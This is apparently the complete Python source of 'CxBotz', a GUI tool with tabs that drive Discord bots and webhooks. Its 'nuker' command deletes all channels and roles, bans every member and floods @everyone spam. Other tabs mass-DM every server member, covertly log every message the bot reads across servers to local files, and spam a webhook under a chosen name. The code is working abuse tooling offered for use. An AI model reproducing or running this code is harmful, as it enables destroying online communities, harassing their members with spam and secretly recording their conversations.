import asyncio
import os
import threading
import time

import aiohttp
import customtkinter as ctk
import discord
from discord import Webhook
from discord.ext import commands

# System Settings
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# App Settings
app = ctk.CTk()
app.title("CxBotz")
app.geometry("700x500")
app.resizable(height=False, width=False)
app.font = ctk.CTkFont(size=20)

excludeSelfV = ctk.StringVar(value="1")
ping = ctk.StringVar(value="1")
sortLS = ctk.StringVar(value="1")
kBot = ctk.StringVar(value="0")
nerdV = ctk.StringVar(value="0")
embedV = ctk.StringVar(value="0")

MainAFrame = ctk.CTkFrame(app, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1, height=30,
                          fg_color='transparent')
MainAFrame.pack(pady=10)

# MainMenu Text
MainText = ctk.CTkLabel(MainAFrame, text="CxBotz", font=("Trebuchet MS", 30))
MainText.pack(pady=10, padx=10)

tabview = ctk.CTkTabview(app, width=700, height=600, border_color="#00876e", border_width=2,
                         segmented_button_selected_color="#00876e")
tabview.pack(padx=20, pady=20)

tabview.add("Info")
tabview.add("CxNuker")
tabview.add("CxMassDm")
tabview.add("CxBotCom")
tabview.add("RunBot")
tabview.add("WebhookSpam")

tabview.set("Info")

# //////////////////////////////////////////////////// Info Tab ///////////////////////////////////////////////////////////////////////////////////////////////

InfoFrame = ctk.CTkFrame(tabview.tab("Info"), corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                         height=30)
InfoFrame.pack(pady=10)

# MainInfoMenu Text
MainInfoText = ctk.CTkLabel(InfoFrame, text="[ Info ]", font=("Trebuchet MS", 20))
MainInfoText.pack(pady=10, padx=10)

# Credits
InfoCredits = ctk.CTkLabel(tabview.tab("Info"), text="[ Made By AnonCx, Chadius & DarkBlade ]",
                           font=("Trebuchet MS", 20))
InfoCredits.pack(pady=10, padx=10)

# Credits
InfoCommands = ctk.CTkLabel(tabview.tab("Info"), text="[ Nuker, MassDm, BotCom Is Still In Development ]",
                            font=("Trebuchet MS", 17))
InfoCommands.pack(pady=10, padx=10)

# //////////////////////////////////////////////////// CxNuker Tab ///////////////////////////////////////////////////////////////////////////////////////////////

# Frame
MainNFrame = ctk.CTkFrame(tabview.tab("CxNuker"), corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                          height=30,
                          fg_color='transparent')
MainNFrame.pack(pady=10)

# MainMenu Text
MainText = ctk.CTkLabel(MainNFrame, text="CxNuker", font=("Trebuchet MS", 20))
MainText.pack(padx=30, pady=5, anchor="center")

SNFrame = ctk.CTkScrollableFrame(tabview.tab("CxNuker"), corner_radius=10, border_color=("#00ffd0", "#00876e"),
                                 border_width=0,
                                 height=400, fg_color='transparent', width=570)
SNFrame.pack()

# Token Input
tokenE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Discord Bot Token", height=38, font=app.font,
                      text_color="white",
                      border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
tokenE.pack(padx=20, pady=(0, 20))

# Prefix Input
prefixE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Bot Prefix", height=38, font=app.font,
                       text_color="white",
                       border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
prefixE.pack(padx=20, pady=(0, 20))

# Message Input
messageE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Message To Spam", height=38, font=app.font,
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
messageE.pack(padx=20, pady=(0, 20))

# Channel Input
channelE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Channel Name", height=38, font=app.font,
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
channelE.pack(padx=20, pady=(0, 20))

# Role Input
roleE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Role Name", height=38, font=app.font,
                     text_color="white",
                     border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
roleE.pack(padx=20, pady=(0, 20))

wMarkFrame = ctk.CTkFrame(SNFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                          height=30,
                          fg_color='transparent')
wMarkFrame.pack()

wMarkT = ctk.CTkLabel(wMarkFrame, text="Made By AnonCx & Chadius & DarkBlade")
wMarkT.pack(padx=30, pady=5)

logTFrame = ctk.CTkFrame(SNFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                         height=30,
                         fg_color='transparent')
logTFrame.pack(pady=10)

logT = ctk.CTkLabel(logTFrame, text="[Log]")
logT.pack(padx=30, pady=5)


def startBot():
    token = tokenE.get()
    prefix = prefixE.get()
    messageName = messageE.get()
    channelName = channelE.get()
    roleName = roleE.get()

    # Define the bots intents
    intents = discord.Intents.all()

    # Create a new bot instance with the defined intents
    bot = commands.Bot(command_prefix=prefix, intents=intents)

    @bot.event
    async def on_connect():
        logT.configure(text="[...Connecting]", text_color="blue")

    @bot.event
    async def on_ready():
        logT.configure(text=f"[ Status: [Bot Ready] Bot Name: {bot.user} ]", text_color="#00876e")

    # Command to nuke the server
    @bot.command()
    async def n(ctx, number: int):
        logT.configure(text=f"[ Starting Nuker ] [ Nuker Is Set To Nuke {number} Times ]", text_color="green")
        numBr = 1
        try:
            # Delete all channels
            for channel in ctx.guild.channels:
                await channel.delete(reason="Server nuked by CxNuker")
                logT.configure(text="Deleting Channel [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error Deleting Channel ]", text_color="yellow")
            pass

        try:
            # Create Channels
            for i in range(number):
                await ctx.guild.create_text_channel(name=f"cx-{channelName}-cx")
                logT.configure(text="Creating Channel [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error Creating Channel ]", text_color="yellow")
            pass
        try:
            # Send messages to each new channel
            for channel in ctx.guild.channels:
                await channel.send(content=f"# @everyone cx- {messageName} -cx @everyone")
                logT.configure(text="Sending Message [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error Sending Message ]", text_color="yellow")
            pass

        # Delete all roles
        try:
            for role in ctx.guild.roles:
                await role.delete(reason="Server nuked by CxNuker")
                logT.configure(text="Deleting Role [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error While Deleting Roles ]", text_color="yellow")
            pass

        try:
            # Create Roles
            for i in range(number):
                await ctx.guild.create_role(name=f"cx-{roleName}-cx")
                logT.configure(text="Creating Role [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error Creating Roles ]", text_color="yellow")
            pass

        try:
            # Ban all members
            for member in ctx.guild.members:
                await member.ban(reason=messageName)
                logT.configure(text="Banning Member [ " + str(numBr + 1) + " ]", text_color="green")
                numBr = numBr + 1
        except:
            logT.configure(text="[ Error Banning Member ]", text_color="yellow")
            pass

        try:
            # Send messages to each channel again
            for i in range(number):
                for channel in ctx.guild.channels:
                    await channel.send(content=f"# @everyone {messageName} @everyone")
                    logT.configure(text="Sending Message [ " + str(numBr + 1) + " ]", text_color="green")
                    numBr = numBr + 1
        except:
            logT.configure(text="[ Error Sending Messages ]", text_color="yellow")
            pass

        logT.configure(text="[Status: [Bot Offline]  [Done Nuking] ]", text_color="blue")
        await bot.close()

    @bot.command()
    @commands.has_permissions(administrator=True)
    async def r(ctx):
        numBr = 1
        # Delete all channels
        for channel in ctx.guild.channels:
            await channel.delete(reason="cleaning up")
            logT.configure(text="Deleted Channel [ " + str(numBr + 1) + " ]", text_color="green")
            numBr = numBr + 1
        await ctx.guild.create_text_channel(name="general")
        logT.configure(text="[Status: [Bot Offline]  [Done Cleaning] ]", text_color="blue")
        await bot.close()

    try:
        # Run the bot with the token
        bot.run(token)
    except:
        logT.configure(text="[ Token Invalid ]", text_color="red")


def runThread2():
    SNButton.configure(text="Started..")
    time.sleep(3)
    SNButton.configure(text="Start Nuker")
    tabview.set("CxNuker")


def runThread():
    threading.Thread(target=startBot).start()
    threading.Thread(target=runThread2).start()


# Start Button
SNButton = ctk.CTkButton(tabview.tab("RunBot"), text="Start Nuker", command=runThread, border_width=1,
                         border_color=("#00ffd0", "#00876e"), fg_color='transparent', hover_color="#00876e")
SNButton.pack(padx=20, pady=10)

# //////////////////////////////////////////////////// CxMassDm Tab ///////////////////////////////////////////////////////////////////////////////////////////////

# Frame
MainNFrame = ctk.CTkFrame(tabview.tab("CxMassDm"), corner_radius=10, border_color=("#00ffd0", "#00876e"),
                          border_width=1,
                          height=30,
                          fg_color='transparent')
MainNFrame.pack(pady=10)

# MainMenu Text
MainText = ctk.CTkLabel(MainNFrame, text="CxMassDm", font=("Trebuchet MS", 20))
MainText.pack(padx=30, pady=5, anchor="center")

SNFrame = ctk.CTkScrollableFrame(tabview.tab("CxMassDm"), corner_radius=10, border_color=("#00ffd0", "#00876e"),
                                 border_width=0,
                                 height=400, fg_color='transparent', width=570)
SNFrame.pack()

# Token Input
tokenME = ctk.CTkEntry(SNFrame, placeholder_text="Enter Discord Bot Token", height=38, font=app.font,
                       text_color="white",
                       border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
tokenME.pack(padx=20, pady=(0, 20))

# Prefix Input
prefixME = ctk.CTkEntry(SNFrame, placeholder_text="Enter Bot Prefix", height=38, font=app.font,
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
prefixME.pack(padx=20, pady=(0, 20))

# Message Input
messageME = ctk.CTkEntry(SNFrame, placeholder_text="Enter Message To Send", height=38, font=app.font,
                         text_color="white",
                         border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
messageME.pack(padx=20, pady=(0, 20))

timesME = ctk.CTkEntry(SNFrame, placeholder_text="Enter How Many Times It Should Repeat", height=38,
                       font=app.font,
                       text_color="white",
                       border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
timesME.pack(padx=20, pady=(0, 20))

wMarkFrameM = ctk.CTkFrame(SNFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                           height=30,
                           fg_color='transparent')
wMarkFrameM.pack()

wMarkTM = ctk.CTkLabel(wMarkFrameM, text="Made By AnonCx & Chadius & DarkBlade")
wMarkTM.pack(padx=30, pady=5)

logTFrameM = ctk.CTkFrame(SNFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                          height=30,
                          fg_color='transparent')
logTFrameM.pack(pady=10)

logTM = ctk.CTkLabel(logTFrameM, text="[Log]")
logTM.pack(padx=30, pady=5)

pingS = ctk.CTkSwitch(SNFrame, text="Ping", variable=ping, onvalue="1", offvalue="0",
                      progress_color="#960325")
pingS.pack(padx=20, pady=5)

excludeSelfS = ctk.CTkSwitch(SNFrame, text="Exclude Self", variable=excludeSelfV, onvalue="1", offvalue="0",
                             progress_color="#960325")
excludeSelfS.pack(padx=20, pady=5)


def startMassDm():
    token = tokenME.get()
    prefix = prefixME.get()
    message = messageME.get()
    times = timesME.get()

    # Define the bots intents
    intents = discord.Intents.all()
    intents.members = True
    intents.message_content = True

    # Create a new bot instance with the defined intents
    bot = commands.Bot(command_prefix=prefix, intents=intents)

    @bot.event
    async def on_connect():
        logTM.configure(text="[...Connecting]", text_color="blue")

    @bot.event
    async def on_ready():
        logTM.configure(text=f"[ Status: [Bot Ready] Bot Name: {bot.user} ]", text_color="#00876e")

    @bot.command(pass_context=True)
    async def dm(ctx):
        if ping.get() == "1":
            for i in range(int(times)):
                for user in ctx.guild.members:
                    try:
                        if excludeSelfV.get() == "1":
                            if str(user.name) != str(ctx.message.author):
                                await user.send(f"@here- {message} -@here")
                                logTM.configure(text=f"Sent Dm To {user.name}", text_color="green")
                            else:
                                logTM.configure(text=f"[ Skipped ] {str(ctx.message.author)}", text_color="magenta")
                        else:
                            await user.send(f"@here- {message} -@here")
                            logTM.configure(text=f"Sent Dm To {user.name}", text_color="green")
                    except:
                        logTM.configure(text=f"Not Able To Dm {user.name}", text_color="yellow")
            logTM.configure(text=f"[ Bot Offline ] Sent A Dm To All Users", text_color="blue")
            await bot.close()
        elif ping.get() == "0":
            for i in range(int(times)):
                for user in ctx.guild.members:
                    try:
                        if excludeSelfV.get() == "1":
                            if str(user.name) != str(ctx.message.author):
                                await user.send(message)
                                logTM.configure(text=f"Sent Dm To {user.name}", text_color="green")
                            else:
                                logTM.configure(text=f"[ Skipped ] {str(ctx.message.author)}", text_color="magenta")
                        else:
                            await user.send(message)
                            logTM.configure(text=f"Sent Dm To {user.name}", text_color="green")
                    except:
                        logTM.configure(text=f"Not Able To Dm {user.name}", text_color="yellow")
            logTM.configure(text=f"[ Bot Offline ] Sent A Dm To All Users", text_color="blue")
            await bot.close()

    try:
        # Run the bot with the token
        bot.run(token)
    except:
        logTM.configure(text="[ Token Invalid ]", text_color="red")


def runThread2MDm():
    SMButton.configure(text="Started..")
    time.sleep(3)
    tabview.set("CxMassDm")
    SMButton.configure(text="Start MassDm")


def runThreadMDm():
    threading.Thread(target=startMassDm).start()
    threading.Thread(target=runThread2MDm).start()


# Start Button
SMButton = ctk.CTkButton(tabview.tab("RunBot"), text="Start MassDm", command=runThreadMDm, border_width=1,
                         border_color=("#00ffd0", "#00876e"), fg_color='transparent', hover_color="#00876e")
SMButton.pack(padx=20, pady=10)

# //////////////////////////////////////////////////// CxBotCom Tab ///////////////////////////////////////////////////////////////////////////////////////////////

# Frame
MainNFrame = ctk.CTkFrame(tabview.tab("CxBotCom"), corner_radius=10, border_color=("#00ffd0", "#00876e"),
                          border_width=1,
                          height=30,
                          fg_color='transparent')
MainNFrame.pack(pady=10)

# MainMenu Text
MainText = ctk.CTkLabel(MainNFrame, text="CxBotCom", font=("Trebuchet MS", 20))
MainText.pack(padx=30, pady=5, anchor="center")

SBFrame = ctk.CTkScrollableFrame(tabview.tab("CxBotCom"), corner_radius=10, border_color=("#00ffd0", "#00876e"),
                                 border_width=0,
                                 height=400, fg_color='transparent', width=570)
SBFrame.pack()

# Token Input
tokenBCE = ctk.CTkEntry(SBFrame, placeholder_text="Enter Discord Bot Token", height=38, font=app.font,
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
tokenBCE.pack(padx=20, pady=(0, 20))

# Prefix Input
emojiBCE = ctk.CTkEntry(SBFrame, placeholder_text="Enter Emoji You Want To Use", height=38, font=app.font,
                        text_color="white", border_width=1, border_color=("#00ffd0", "#00876e"), width=1000)
emojiBCE.pack(padx=20, pady=(0, 20))

logTFrameBC = ctk.CTkScrollableFrame(SBFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                                     height=200, fg_color='transparent', width=570)
logTFrameBC.pack(pady=10)

logTBC = ctk.CTkLabel(logTFrameBC, text="[ BotCom Activated ]")
logTBC.pack(padx=30, pady=5)

sortLSS = ctk.CTkSwitch(SBFrame, text="Sort Logs", variable=sortLS, onvalue="1", offvalue="0",
                        progress_color="#960325")
sortLSS.pack(padx=20, pady=5)
killBotS = ctk.CTkSwitch(SBFrame, text="Kill Bot", variable=kBot, onvalue="1", offvalue="0",
                         progress_color="#960325")
killBotS.pack(padx=20, pady=5)
nerdS = ctk.CTkSwitch(SBFrame, text="React With Emoji", variable=nerdV, onvalue="1", offvalue="0",
                      progress_color="#960325")
nerdS.pack(padx=20, pady=5)


def startBotCom():
    token = tokenBCE.get()
    emoji = emojiBCE.get()
    sort = sortLS.get()
    # Define the bots intents
    intents = discord.Intents.all()
    intents.members = True
    intents.message_content = True

    # Create a new bot instance with the defined intents
    bot = commands.Bot(command_prefix=".", intents=intents)

    @bot.event
    async def on_connect():
        ocLBC = ctk.CTkLabel(logTFrameBC, text="[...Connecting]", text_color="blue")
        ocLBC.pack()

    @bot.event
    async def on_ready():
        orLBC = ctk.CTkLabel(logTFrameBC, text=f"[ Status: [Bot Ready] Bot Name: {bot.user} ]",
                             text_color="#00876e")
        orLBC.pack()

    @bot.event
    async def on_message(message):
        if kBot.get() == "1":
            kBotL = ctk.CTkLabel(logTFrameBC, text=f"[ Killed Bot : {bot.user} ] \n[ Reason = Kill Bot Activated ]",
                                 text_color="red")
            kBotL.pack()
            await bot.close()
        else:
            if nerdV.get() == "1":
                try:
                    await message.add_reaction("")
                except:
                    pass

            if sort == "1":
                try:
                    with open(f'BotComLogs/botcom_{message.guild}.log', "a+") as file:
                        file.seek(0)
                        data = file.read(100)
                        if len(data) > 0:
                            file.write("\n")
                        file.write(
                            f"[ {message.author} ] In [ {message.guild} ] [{message.channel} ]  > {message.content}")
                except:
                    os.mkdir("BotComLogs")
                    with open(f'BotComLogs/botcom_{message.guild}.log', "a+") as file:
                        file.seek(0)
                        data = file.read(100)
                        if len(data) > 0:
                            file.write("\n")
                        file.write(
                            f"[ {message.author} ] In [ {message.guild} ] [{message.channel} ]  > {message.content}")

            elif sort == "0":
                try:
                    with open('BotComLogs/botcom_all.log', "a+") as file:
                        file.seek(0)
                        data = file.read(100)
                        if len(data) > 0:
                            file.write("\n")
                        file.write(
                            f"[ {message.author} ] In [ {message.guild} ] [{message.channel} ]  > {message.content}")
                except:
                    os.mkdir("BotComLogs")
                    with open('BotComLogs/botcom_all.log', "a+") as file:
                        file.seek(0)
                        data = file.read(100)
                        if len(data) > 0:
                            file.write("\n")
                        file.write(
                            f"[ {message.author} ] In [ {message.guild} ] [{message.channel} ]  > {message.content}")
            mlLBC = ctk.CTkLabel(logTFrameBC,
                                 text=f"[ {message.author} ] In [ {message.guild} ] > {message.content}",
                                 text_color="green")
            mlLBC.pack()
            file.close()


    try:
        # Run the bot with the token
        bot.run(token)
    except:
        itLBC = ctk.CTkLabel(logTFrameBC, text=f"[ Invalid Token ]",
                             text_color="red")
        itLBC.pack()


def runThread2BC():
    SBCButton.configure(text="Started..")
    time.sleep(3)
    tabview.set("CxBotCom")
    SBCButton.configure(text="Start BotCom")


def runThreadBC():
    threading.Thread(target=startBotCom).start()
    threading.Thread(target=runThread2BC).start()


# Start Button
SBCButton = ctk.CTkButton(tabview.tab("RunBot"), text="Start BotCom", command=runThreadBC, border_width=1,
                          border_color=("#00ffd0", "#00876e"), fg_color='transparent', hover_color="#00876e")
SBCButton.pack(padx=20, pady=10)

# //////////////////////////////////////////////////// WebhookSpammer ///////////////////////////////////////////////////////////////////////////////////////////////

logTFrame = ctk.CTkFrame(tabview.tab("WebhookSpam"), corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1,
                         height=30,
                         fg_color='transparent')
logTFrame.pack()

logT = ctk.CTkLabel(logTFrame, text="[Log]")
logT.pack(padx=30, pady=5)


def runThread():
    threading.Thread(target=sendToWebhook).start()


def sendToWebhook():
    avurl = "https://cdn.discordapp.com/attachments/1175478810016219268/1179149282239062127/108609556.jpeg?ex=6578bb58&is=65664658&hm=c9130b222f9e0ddd01a7eae8137825daec08a62b07ce63b3f35fa856c726d0e1&"
    try:
        async def anything(webhook2):
            async with aiohttp.ClientSession() as session:
                message = MessageE.get()
                times = int(TimesE.get())
                user = UserE.get()
                numBr = 1
                for i in range(times):
                    numBr = numBr + 1
                    webhook = Webhook.from_url(webhook2, session=session)
                    if embedV.get() == "1":
                        embed = discord.Embed(
                            title=message)
                        await webhook.send(embed=embed, username=user, avatar_url=avurl)
                    else:
                        await webhook.send(username=user, content=message, avatar_url=avurl)
                    logT.configure(text=f"Send Message [Remaining: {str(numBr)}/{str(times)}", text_color="green")

        webhook2 = tokenE.get()

        loop = asyncio.new_event_loop()
        loop.run_until_complete(anything(webhook2))
        loop.close()
        logT.configure(text=f"Done", text_color="magenta")
    except:
        logT.configure(text="Error Sending Message [Error Happened]", text_color="red")


MainAFrame = ctk.CTkFrame(tabview.tab("WebhookSpam"), corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1, height=30,
                          fg_color='transparent')
MainAFrame.pack(pady=10)

mainLable = ctk.CTkLabel(MainAFrame, text="CxMessageSpam", font=app.font)
mainLable.pack(pady=10)

MainBFrame = ctk.CTkFrame(tabview.tab("WebhookSpam"), corner_radius=10, border_color=("#00ffd0", "#00876e"), border_width=1, height=30,
                          fg_color='transparent')
MainBFrame.pack(pady=10)

SNFrame = ctk.CTkScrollableFrame(MainBFrame, corner_radius=10, border_color=("#00ffd0", "#00876e"),
                                 border_width=0,
                                 height=400, fg_color='transparent', width=570)
SNFrame.pack()

# Token Input
tokenE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Webhook", height=38, font=("Trebuchet MS", 30),
                      text_color="white",
                      border_width=1, border_color=("#00ffd0", "#00876e"), width=400, fg_color='transparent')
tokenE.pack(padx=20, pady=10)

# Message Input
MessageE = ctk.CTkEntry(SNFrame, placeholder_text="Enter Message To Spam", height=38, font=("Trebuchet MS", 30),
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#00876e"), width=400, fg_color='transparent')
MessageE.pack(padx=20, pady=10)

# Message Input
TimesE = ctk.CTkEntry(SNFrame, placeholder_text="How Many Times?", height=38, font=("Trebuchet MS", 30),
                      text_color="white",
                      border_width=1, border_color=("#00ffd0", "#00876e"), width=400, fg_color='transparent')
TimesE.pack(padx=20, pady=10)

# Message Input
UserE = ctk.CTkEntry(SNFrame, placeholder_text="User Name", height=38, font=("Trebuchet MS", 30),
                     text_color="white",
                     border_width=1, border_color=("#00ffd0", "#00876e"), width=400, fg_color='transparent')
UserE.pack(padx=20, pady=10)

embedS = ctk.CTkSwitch(SNFrame, text="Send As Embed", variable=embedV, onvalue="1", offvalue="0",
                       progress_color="#960325")
embedS.pack(padx=20, pady=5)

# Start
StartButton = ctk.CTkButton(SNFrame, text="Start Spamming", border_width=1,
                            border_color=("#0062ff", "#00876e"), fg_color='transparent', hover_color="#00876e",
                            font=("Trebuchet MS", 30), text_color="white", command=runThread)
StartButton.pack(pady=3)

# //////////////////////////////////////////////////// End ///////////////////////////////////////////////////////////////////////////////////////////////

app.mainloop()
